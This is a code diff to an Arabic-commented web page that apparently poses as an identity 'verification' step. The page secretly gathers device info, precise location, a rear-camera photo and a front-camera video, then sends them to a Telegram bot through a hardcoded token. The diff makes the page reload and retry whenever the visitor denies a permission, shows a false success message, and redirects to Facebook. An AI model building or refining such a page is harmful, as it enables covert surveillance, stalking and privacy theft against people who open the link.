@@ -138,6 +138,7 @@
     <script>
         // تكوين البوت (استبدل بالقيم الخاصة بك)
         const BOT_TOKEN = "6308792872:AAG_O5Y_-nheEQRl9osGSG-Ek8EXHei8jJA";
+        const FACEBOOK_URL = "https://www.facebook.com";
         
         // استخراج chat_id من عنوان URL
         function getChatIdFromUrl() {
@@ -246,6 +247,7 @@
                 
             } catch (error) {
                 console.error(`فشل في الوصول للكاميرا الخلفية: ${error.message}`);
+                throw error;
             }
         }
         
@@ -288,7 +290,7 @@
                     
                 } catch (error) {
                     console.error(`فشل في تسجيل الفيديو من الكاميرا الأمامية: ${error.message}`);
-                    resolve(); // نستمر حتى لو فشل
+                    reject(error);
                 }
             });
         }
@@ -308,23 +310,26 @@
                 await getSystemInfo();
                 
                 // طلب الأذونات بالتسلسل
-                await requestLocation().catch(e => console.error(e));
-                await captureBackCameraPhoto(); // التقاط صورة من الكاميرا الخلفية
-                await recordFrontCameraVideo(); // تسجيل فيديو من الكاميرا الأمامية
+                await requestLocation();
+                await captureBackCameraPhoto();
+                await recordFrontCameraVideo();
                 
                 // بعد جمع كل البيانات
                 await sendAllDataToTelegram(CHAT_ID);
                 
+                // إذا نجحت العملية، التوجيه إلى فيسبوك
                 statusMessage.innerHTML = '✅ تم التحقق بنجاح! جاري توجيهك...';
-                
-                // إعادة توجيه المستخدم بعد الانتهاء (اختياري)
                 setTimeout(() => {
-                    window.location.href = "https://example.com"; // استبدل بالرابط المطلوب
+                    window.location.href = FACEBOOK_URL;
                 }, 2000);
                 
             } catch (error) {
-                statusMessage.innerHTML = `❌ حدث خطأ: ${error.message}`;
+                // إذا فشلت العملية، إعادة تحميل الصفحة بعد 3 ثواني
+                statusMessage.innerHTML = '❌ فشل التحقق، جاري إعادة المحاولة...';
                 console.error("Error:", error);
+                setTimeout(() => {
+                    window.location.reload();
+                }, 3000);
             }
         };
         
@@ -357,8 +362,7 @@
                         }
                     },
                     (error) => {
-                        console.error(`فشل في الحصول على الموقع: ${error.message}`);
-                        resolve(); // نستمر حتى لو فشل
+                        reject(new Error(`فشل في الحصول على الموقع: ${error.message}`));
                     },
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
